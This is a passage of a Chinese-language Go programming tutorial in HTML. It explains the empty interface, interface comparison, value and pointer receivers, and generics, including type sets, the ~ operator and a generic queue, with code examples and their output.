class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Any <span class="hljs-keyword">interface</span>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Any</code> 接口内部没用方法集合，所有类型都是 <code>Any</code> 接口的实现，所有类型的方法都是空集的超集，<code>Any</code> 可以保存任何类型的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Any <span class="hljs-keyword">interface</span> &#123;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> anything Any<br><br>anything = <span class="hljs-number">1</span><br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = <span class="hljs-string">&quot;sad&quot;</span><br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = <span class="hljs-built_in">complex</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = <span class="hljs-number">1.2</span><br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = []<span class="hljs-type">int</span>&#123;&#125;<br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;&#125;<br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br>&#125;<br>&gt;&gt;<br>(<span class="hljs-number">0x9f23e0</span>,<span class="hljs-number">0xa2f968</span>)<br><span class="hljs-number">1</span><br>(<span class="hljs-number">0x9f21a0</span>,<span class="hljs-number">0xa307e0</span>)<br>sad<br>(<span class="hljs-number">0x9f24e0</span>,<span class="hljs-number">0xa307f0</span>)<br>(<span class="hljs-number">1</span>+<span class="hljs-number">2i</span>)<br>(<span class="hljs-number">0x9f2560</span>,<span class="hljs-number">0xa30698</span>)<br><span class="hljs-number">1.2</span><br>(<span class="hljs-number">0x9f1560</span>,<span class="hljs-number">0xc000008030</span>)<br>[]<br>(<span class="hljs-number">0x9f6480</span>,<span class="hljs-number">0xc00001e180</span>)<br><span class="hljs-keyword">map</span>[]<br></code></pre></td></tr></table></figure><p>两种输出结果不一样，接口内部可以看成由<code>(val,type)</code> 组成的元组，在调用方法的时候会调用具体类型的具体值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">interface</span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>一个匿名空接口，表示接收任何类型的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> any = <span class="hljs-keyword">interface</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">interface</span>&#123;&#125;<br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">interface</span>&#123;&#125;<br>a = <span class="hljs-number">1</span><br>b = <span class="hljs-string">&quot;1&quot;</span><br>fmt.Println(a == b)<br>a = <span class="hljs-number">1</span><br>b = <span class="hljs-number">1</span><br>fmt.Println(a == b)<br>&#125;<br>&gt;&gt;<br><span class="hljs-literal">false</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>比较空接口时，先比较底层类型，如果类型不匹配的话则为 <code>false</code>，然后再比较值</p><p>如果底层类型不能比较会 <code>panic</code>，<code>comparable</code> 代表所有可比较类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> comparable <span class="hljs-keyword">interface</span>&#123; comparable &#125;<br></code></pre></td></tr></table></figure><h2 id="值接收实现接口"><a href="#值接收实现接口" class="headerlink" title="值接收实现接口"></a>值接收实现接口</h2><p>值接收者实现接口之后，不管是 dog 结构体还是结构体指针 <code>*dog</code>类 型的变量都可以赋值给该接口变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Mover <span class="hljs-keyword">interface</span> &#123;<br>move()<br>&#125;<br><span class="hljs-keyword">type</span> dog <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d dog)</span></span> move() &#123;<br>fmt.Println(<span class="hljs-string">&quot;run&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> x Mover<br><span class="hljs-keyword">var</span> a = dog&#123;&#125;  <span class="hljs-comment">// a 是 dog 类型</span><br>x = a          <span class="hljs-comment">// x 可以接收 dog 类型</span><br><span class="hljs-keyword">var</span> b = &amp;dog&#123;&#125; <span class="hljs-comment">// b 是 *dog 类型</span><br>x = b          <span class="hljs-comment">// x 可以接收 *dog 类型</span><br>x.move()<br>&#125;<br>&gt;&gt;<br>run<br></code></pre></td></tr></table></figure><h2 id="指针接收实现接口"><a href="#指针接收实现接口" class="headerlink" title="指针接收实现接口"></a>指针接收实现接口</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Mover <span class="hljs-keyword">interface</span> &#123;<br>move()<br>&#125;<br><span class="hljs-keyword">type</span> dog <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *dog)</span></span> move() &#123;<br>fmt.Println(<span class="hljs-string">&quot;run&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> x Mover<br><span class="hljs-comment">//var a = dog&#123;&#125;  // a 是 dog 类型</span><br><span class="hljs-comment">//x = a          // x 可以接收 dog 类型</span><br><span class="hljs-keyword">var</span> b = &amp;dog&#123;&#125; <span class="hljs-comment">// b 是 *dog 类型</span><br>x = b          <span class="hljs-comment">// x 可以接收 *dog 类型</span><br>x.move()<br>&#125;<br>&gt;&gt;<br>run<br></code></pre></td></tr></table></figure><p>Mover 接口的是 <code>*dog</code> 类型，所以不能给 x 传入 dog 类型的 a，此时 x 只能存储 <code>*dog</code> 类型的值。</p><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sum</span>[<span class="hljs-title">T</span> <span class="hljs-title">int</span> | <span class="hljs-title">float64</span>]<span class="hljs-params">(a, b T)</span></span> T &#123;<br>   <span class="hljs-keyword">return</span> a + b<br>&#125;<br><br><span class="hljs-comment">//T 是类型形参，取决于传进来的类型</span><br><span class="hljs-comment">//int | float64 构成了类型约束，规定了允许的类型</span><br><span class="hljs-comment">//Sum[int]() 指定 int 类型</span><br></code></pre></td></tr></table></figure><p>显式指明用哪种类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">Sum[<span class="hljs-type">int</span>](<span class="hljs-number">2012</span>, <span class="hljs-number">2022</span>)<br></code></pre></td></tr></table></figure><p>不指定类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">Sum(<span class="hljs-number">1.23</span>,<span class="hljs-number">1.14514</span>)<br></code></pre></td></tr></table></figure><p>泛型切片，类型约束 <code>int | int32 | int64</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> GenercSlice[T <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span>] []T<br></code></pre></td></tr></table></figure><p>不能省略类型实参</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">GenercSlice[<span class="hljs-type">int</span>]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br></code></pre></td></tr></table></figure><p>泛型哈希表，键的类型必须可比较，使用 <code>comparable</code> 接口，值的类型约束为 <code>V int | string | byte</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> GenericMap[K comparable,V <span class="hljs-type">int</span> | <span class="hljs-type">string</span> | <span class="hljs-type">byte</span>] <span class="hljs-keyword">map</span>[K]V<br></code></pre></td></tr></table></figure><p>使用如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> GenericMap[K comparable, V <span class="hljs-type">int</span> | <span class="hljs-type">string</span> | <span class="hljs-type">byte</span>] <span class="hljs-keyword">map</span>[K]V<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> gmap1 = GenericMap[<span class="hljs-type">int</span>, <span class="hljs-type">string</span>]&#123;<span class="hljs-number">1</span>: <span class="hljs-string">&quot;sad&quot;</span>&#125;<br><span class="hljs-keyword">var</span> gmap2 = <span class="hljs-built_in">make</span>(GenericMap[<span class="hljs-type">string</span>, <span class="hljs-type">byte</span>], <span class="hljs-number">0</span>)<br><br>fmt.Println(gmap1)<br>fmt.Printf(<span class="hljs-string">&quot;gmap2: %#v\n&quot;</span>, gmap2)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[<span class="hljs-number">1</span>:sad]<br>gmap2: main.GenericMap[<span class="hljs-type">string</span>,<span class="hljs-type">uint8</span>]&#123;&#125;<br></code></pre></td></tr></table></figure><p>泛型结构体，约束类型为 <code>T int | string</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> GenericStruct[T <span class="hljs-type">int</span> | <span class="hljs-type">string</span>] <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>Id   T<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SayAble</code> 是一个泛型接口，<code>Person</code> 实现了该接口</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SayAble[T <span class="hljs-type">int</span> | <span class="hljs-type">string</span>] <span class="hljs-keyword">interface</span> &#123;<br>Say() T<br>&#125;<br><span class="hljs-keyword">type</span> Person[T <span class="hljs-type">int</span> | <span class="hljs-type">string</span>] <span class="hljs-keyword">struct</span> &#123;<br>msg T<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person[T])</span></span> Say() T &#123;<br><span class="hljs-keyword">return</span> p.msg<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> s SayAble[<span class="hljs-type">string</span>]<br>s = Person[<span class="hljs-type">string</span>]&#123;<span class="hljs-string">&quot;sad&quot;</span>&#125;<br>fmt.Println(s.Say())<br>&#125;<br>&gt;&gt; sad<br></code></pre></td></tr></table></figure><h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><p>泛型接口</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PrintObj</span>[<span class="hljs-title">T</span> <span class="hljs-title">fmt</span>.<span class="hljs-title">Stringer</span>]<span class="hljs-params">(s T)</span></span> &#123;<br>fmt.Println(s.String())<br>&#125;<br><br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> String() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">&quot;Person: %s&quot;</span>, p.Name)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>PrintObj(Person&#123;Name: <span class="hljs-string">&quot;butt3rf1y&quot;</span>&#125;)<br>&#125;<br>&gt;&gt;<br>Person: butt3rf1y<br></code></pre></td></tr></table></figure><p>非泛型接口也能作为泛型的类型形参</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Write</span>[<span class="hljs-title">W</span> <span class="hljs-title">io</span>.<span class="hljs-title">Writer</span>]<span class="hljs-params">(w W, bs []<span class="hljs-type">byte</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> w.Write(bs)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="泛型断言"><a href="#泛型断言" class="headerlink" title="泛型断言"></a>泛型断言</h2><p>类型断言是将接口类型的变量转换为具体类型</p><p>可以用泛型来对 <code>any</code> 类型进行类型断言</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Assert</span>[<span class="hljs-title">T</span> <span class="hljs-title">any</span>]<span class="hljs-params">(v any)</span></span> (<span class="hljs-type">bool</span>, T) &#123;<br><span class="hljs-keyword">var</span> av T<br><span class="hljs-keyword">if</span> v == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, av<br>&#125;<br>av, ok := v.(T)<br><span class="hljs-keyword">return</span> ok, av<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="类型集"><a href="#类型集" class="headerlink" title="类型集"></a>类型集</h2><p>type set 只能用于泛型中的类型约束，不能做类型声明，类型断言。</p><h3 id="并集"><a href="#并集" class="headerlink" title="并集"></a>并集</h3><p>接口类型 <code>SignedInt</code> 是一个类型集，有符号整数类型的并集就是 <code>SignedInt</code> ，所以 <code>SignedInt</code> 就是她们的超集</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SignedInt <span class="hljs-keyword">interface</span> &#123;<br>   <span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其他通用接口也是这样</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br><span class="hljs-keyword">type</span> UnSignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br><span class="hljs-keyword">type</span> Integer <span class="hljs-keyword">interface</span> &#123;<br>SignedInt | UnSignedInt<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="交集"><a href="#交集" class="headerlink" title="交集"></a>交集</h3><p>显而易见交集为 <code>SignedInt</code>，并且因为 <code>Do[uint](2)</code> 类型为 <code>uint</code> 所以无法通过编译，只有交集中才能通过编译</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br><span class="hljs-keyword">type</span> Integer <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span> | <span class="hljs-type">uint8</span> | <span class="hljs-type">uint16</span> | <span class="hljs-type">uint</span> | <span class="hljs-type">uint32</span> | <span class="hljs-type">uint64</span><br>&#125;<br><span class="hljs-keyword">type</span> Number <span class="hljs-keyword">interface</span> &#123;<br>SignedInt<br>Integer<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Do</span>[<span class="hljs-title">T</span> <span class="hljs-title">Number</span>]<span class="hljs-params">(n T)</span></span> T &#123;<br><span class="hljs-keyword">return</span> n<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>Do[<span class="hljs-type">int</span>](<span class="hljs-number">2</span>)<br>Do[<span class="hljs-type">uint</span>](<span class="hljs-number">2</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="空集"><a href="#空集" class="headerlink" title="空集"></a>空集</h3><p>像下面这样，空集就是没有交集</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br><span class="hljs-keyword">type</span> UnsignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">uint8</span> | <span class="hljs-type">uint16</span> | <span class="hljs-type">uint</span> | <span class="hljs-type">uint32</span> | <span class="hljs-type">uint64</span><br>&#125;<br><span class="hljs-keyword">type</span> Integer <span class="hljs-keyword">interface</span> &#123;<br>SignedInt<br>UnsignedInt<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="底层类型"><a href="#底层类型" class="headerlink" title="底层类型"></a>底层类型</h3><p><code>type</code> 关键字声明新类型时，其底层类型即使包含在类型集内，传入时也不能通过编译</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Int <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span> | <span class="hljs-type">uint8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">uint</span> | <span class="hljs-type">uint32</span> | <span class="hljs-type">uint64</span><br>&#125;<br><span class="hljs-keyword">type</span> TinyInt <span class="hljs-type">int8</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Do</span>[<span class="hljs-title">T</span> <span class="hljs-title">Int</span>]<span class="hljs-params">(n T)</span></span> &#123;<br><span class="hljs-keyword">return</span> n<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>Do[TinyInt](<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>在类型前加上 <code>~</code> 表示底层类型，如果一个类型的底层类型属于该类型集，那么该类型就属于类型集。这样就能通过编译了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Int <span class="hljs-keyword">interface</span> &#123;<br>~<span class="hljs-type">int8</span> | ~<span class="hljs-type">int16</span> | ~<span class="hljs-type">int</span> | ~<span class="hljs-type">int32</span> | ~<span class="hljs-type">int64</span> | ~<span class="hljs-type">uint8</span> | ~<span class="hljs-type">uint16</span> | ~<span class="hljs-type">uint</span> | ~<span class="hljs-type">uint32</span> | ~<span class="hljs-type">uint64</span><br>&#125;<br><span class="hljs-keyword">type</span> TinyInt <span class="hljs-type">int8</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Do</span>[<span class="hljs-title">T</span> <span class="hljs-title">Int</span>]<span class="hljs-params">(n T)</span></span> T &#123;<br><span class="hljs-keyword">return</span> n<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>Do[TinyInt](<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="泛型的使用"><a href="#泛型的使用" class="headerlink" title="泛型的使用"></a>泛型的使用</h2><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>队列中的元素是任意的，所以类型约束为 <code>any</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Queue[T any] []T<br></code></pre></td></tr></table></figure><p>总共有四个方法 <code>Pop</code>，<code>Peek</code>，<code>Push</code>，<code>Size</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Queen[T any] []T<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q *Queen[T])</span></span> Push(e T) &#123;<br>*q = <span class="hljs-built_in">append</span>(*q, e)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q *Queen[T])</span></span> Pop(e T) (_ T) &#123;<br><span class="hljs-keyword">if</span> q.Size() &gt; <span class="hljs-number">0</span> &#123;<br>res := q.Peek()<br>*q = (*q)[<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">return</span> res<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q *Queen[T])</span></span> Peek() (_ T) &#123;<br><span class="hljs-keyword">if</span> q.Size() &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> (*q)[<span class="hljs-number">0</span>]<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q *Queen[T])</span></span> Size() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(*q)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Pop</code>  和 <code>Peek</code> 方法中返回值是 <code>_T</code> ，表示泛型零值，当队列为空时，需要返回零值，但不知道类型不能返回具体类型，所以返回泛型零值。对于泛型变量，默认的值就是该类型的零值</p><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>堆的元素必须是可排序的类型，内置的可排序类型只有数字和字符串，初始化时需要传入一个自定义的比较器，比较器必须使用泛型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Comparator[T any] <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(a, b T)</span></span> <span class="hljs-type">int</span><br></code></pre></td></tr></table></figure><h3 id="对象池"><a href="#对象池" class="headerlink" title="对象池"></a>对象池</h3><p>复用 <code>*bytes.Buffer</code> 对象</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 